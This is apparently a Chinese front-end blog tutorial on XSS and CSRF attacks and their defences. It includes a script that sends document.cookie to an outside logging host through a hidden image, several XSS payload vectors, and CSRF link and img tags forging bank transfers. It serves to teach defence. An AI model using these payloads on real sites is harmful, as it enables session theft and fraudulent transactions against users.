---
title: XSS、CSRF攻击问题详解
date: 2019-10-19 19:39:07
tags: [前端,WEB]
categories: 前端
keywords: [前端,CRSF,XSS,WEB]
description: 
---
一个好的网站，需要经得起Hacker的各种攻击，不久前在公司里给手上的项目做过一次安全性能的大升级，这次就专门来总结一下Web常见的一些安全攻击及其解决方法。

<!-- more -->

XSS（Cross Site Script）
--------------
### XSS原理
XSS 攻击是指攻击者在网站上注入恶意的客户端代码，通过恶意脚本对客户端网页进行篡改，从而在用户浏览网页时，对用户浏览器进行控制或者获取用户隐私数据的一种攻击方式。
攻击者对客户端网页注入的恶意脚本一般包括 JavaScript，有时也会包含 HTML 和 Flash。有很多种方式进行 XSS 攻击，但它们的共同点为：将一些隐私数据像 cookie、session 发送给攻击者，将受害者重定向到一个由攻击者控制的网站，在受害者的机器上进行一些恶意操作。

### 常见场景
#### 存储型
存储型 XSS 会把用户输入的数据 “存储” 在服务器端，当浏览器请求数据时，脚本从服务器上传回并执行。这种 XSS 攻击具有很强的稳定性。
##### input标签中注入script语句
攻击者在社区或论坛上写下一篇包含恶意 JavaScript 代码的文章或评论，文章或评论发表后，所有访问该文章或评论的用户，都会在他们的浏览器中执行这段恶意的 JavaScript 代码。
当然不能直接把用户的 cookie 直接 alert 出来，因为同源策略严格限制了 JavaScript 的跨域访问，但同源策略并不限制 `<img>` 这样的标签从别的网站（跨域）去下载图片，所以可以通过创建一个不可见的 `<img>`，通过这个 `<img>` 发cookie到自己的服务器。
```
var img=document.createElement("img");
img.src="http://web.com/log?"+escape(document.cookie);
document.body.appendChild(img);
```

##### URL内注入script语句
攻击直接将类似获取 cookie 等操作的语句通过 script 标签写在URL链接里，请求访问后台。
```
http://test.php?x=<script>alert('chenie')</script>
```

#### 反射型
反射型 XSS 只是简单地把用户输入的数据 “反射” 给浏览器，这种攻击方式往往需要攻击者诱使用户点击一个恶意链接，或者提交一个表单，或者进入一个恶意网站时，注入脚本进入被攻击者的网站。
```
<a href="localhost:8001/?q=111&p=222" >test</a>

const http = require('http');
function handleReequest(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.writeHead(200, {'Content-Type': 'text/html; charset=UTF-8'});
    res.write('<script>alert("反射型 XSS 攻击")</script>');
    res.end();
}
 
const server = new http.Server();
server.listen(8001, '127.0.0.1');
server.on('request', handleReequest);
```
当用户点击恶意链接时，页面跳转到攻击者预先准备的页面，会发现在攻击者的页面执行了 js 脚本。

#### 基于DOM型
基于 DOM 的 XSS 攻击是指通过恶意脚本修改页面的 DOM 结构，是纯粹发生在客户端的攻击。
##### a标签中
```
<a href="http://www.evil.com/?test=" οnclick=alert(1)"" >test</a>
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4=" >test</a>
<a href=# οnclick="funcA('');alert(/xss/);//')" >test</a>
```

##### CSS中
```
body {background-image:url("javascript:alert('XSS')");}
body {background-image:expression(alert(/xss/));}
```

### 解决方案
#### HttpOnly 防止劫取 Cookie
在网站的Cookie加上HttpOnly属性
```
Set-Cookie: JSESSIONID=xxxxxx;Path=/;Domain=book.com;HttpOnly
```
这样浏览器就禁止JavaScript的读取了。

#### XSS Filter输入过滤
过滤用户输入的 检查用户输入的内容中是否有非法内容。如<>（尖括号）、”（引号）、 ‘（单引号）、%（百分比符号）、;（分号）、()（括号）、&（& 符号）、+（加号）等。
```
const decodingMap = {
  '&lt;': '<',
  '&gt;': '>',
  '&quot;': '"',
  '&amp;': '&',
  '
  ': '\n'
}
```
可以利用下面这些函数对出现xss漏洞的参数进行过滤
+ htmlspecialchars() 函数,用于转义处理在页面上显示的文本。
+ htmlentities() 函数,用于转义处理在页面上显示的文本。
+ strip_tags() 函数,过滤掉输入、输出里面的恶意标签。
+ header() 函数,使用header("Content-type:application/json"); 用于控制 json 数据的头部，不用于浏览。
+ urlencode() 函数,用于输出处理字符型参数带入页面链接中。
+ intval() 函数用于处理数值型参数输出页面中。
+ OWASP Esapi 的 encodeForCSS()、encodeForHTML()、encodeForJavaScript()

#### 输出检查
用户的输入会存在问题，服务端的输出也会存在问题。一般来说，除富文本的输出外，在变量输出到 HTML 页面时，可以使用编码或转义的方式来防御 XSS 攻击。例如利用 sanitize-html 对输出内容进行有规则的过滤之后再输出到页面中。

CSRF（Cross Site Request Forgery）
--------------
### CSRF原理
可缩写为CSRF或者XSRF，是一种劫持受信任用户向服务器发送非预期请求的攻击方式。通常情况下，CSRF 攻击是攻击者借助受害者的 Cookie 骗取服务器的信任，可以在受害者毫不知情的情况下以受害者名义伪造请求发送给受攻击服务器，从而在并未授权的情况下执行在权限保护之下的操作。

### CSRF 特点
+ 攻击一般发起在第三方网站，而不是被攻击的网站。被攻击的网站无法防止攻击发生。
+ 攻击利用受害者在被攻击网站的登录凭证，冒充受害者提交操作；而不是直接窃取数据。
+ 整个过程攻击者并不能获取到受害者的登录凭证，仅仅是“冒用”。
+ 跨站请求可以用各种方式：图片URL、超链接、CORS、Form提交等等。部分请求方式可以直接嵌入在第三方论坛、文章中，难以进行追踪。

### 常见场景
#### 在a标签中
```
<a href="www.icbc.com.cn/transfer?toBankId=黑客的账户&money=金额">
```
这得先知道icbc.com.cn的转账操作的url和参数名称。
如果这个用户恰好登录了icbc.com，那他的cookie还在，当他禁不住诱惑，点了这个链接后，一个转账操作就神不知鬼不觉的发生了。

#### 在img标签中
```
<img src="www.icbc.com.cn/transfer?toAccountID=黑客三兄弟的账户&money=金额">
```
只要用户打开了这个页面，不点击任何东西，就会发生转账操作。

### 解决方案
#### 验证码
验证码被认为是对抗 CSRF 攻击最简洁而有效的防御方法。CSRF 攻击往往是在用户不知情的情况下构造了网络请求。而验证码会强制用户必须与应用进行交互，才能完成最终请求。因为通常情况下，验证码能够很好地遏制 CSRF 攻击
但验证码并不是万能的，因为出于用户考虑，不能给网站所有的操作都加上验证码。因此，验证码只能作为防御 CSRF 的一种辅助手段，而不能作为最主要的解决方案。

#### Referer Check
根据 HTTP 协议，在 HTTP 头中有一个字段叫 Referer，它记录了该 HTTP 请求的来源地址。通过 Referer Check，可以检查请求是否来自合法的”源”。
比如某银行的转账是通过用户访问http://www.xxx.com/transfer.do页面完成的，用户必须先登录www.xxx.com，然后通过单击页面上的提交按钮来触发转账事件。当用户提交请求时，该转账请求的Referer值就会是提交按钮所在页面的URL（本例为www.xxx. com/transfer.do）。如果攻击者要对银行网站实施CSRF攻击，他只能在其他网站构造请求，当用户通过其他网站发送请求到银行时，该请求的Referer的值是其他网站的地址，而不是银行转账页面的地址。
因此，要防御 CSRF 攻击，只需要对于每一个删帖请求验证其 Referer 值，如果是以 www.xx.om 开头的域名，则说明该请求是来自网站自己的请求，是合法的。如果 Referer 是其他网站的话，则有可能是 CSRF 攻击，可以拒绝该请求。
```
String referer = request.getHeader("Referer");
if (referer !== 'http://www.c.com:8002/') {
    res.write('csrf 攻击');
    return;
}
```

#### 添加 token 验证
用户打开页面的时候，服务器需要给这个用户生成一个Token，该Token通过加密算法对数据进行加密，一般Token都包括随机字符串和时间戳的组合，显然在提交时Token不能再放在Cookie中了，否则又会被攻击者冒用。因此，为了安全起见Token最好还是存在服务器的Session中，之后在每次页面加载时，使用JS遍历整个DOM树，对于DOM中所有的a和form标签后加入Token。这样可以解决大部分的请求，但是对于在页面加载之后动态生成的HTML代码，这种方法就没有作用，还需要程序员在编码时手动添加Token。
页面提交的请求携带这个Token，服务器验证Token是否正确。

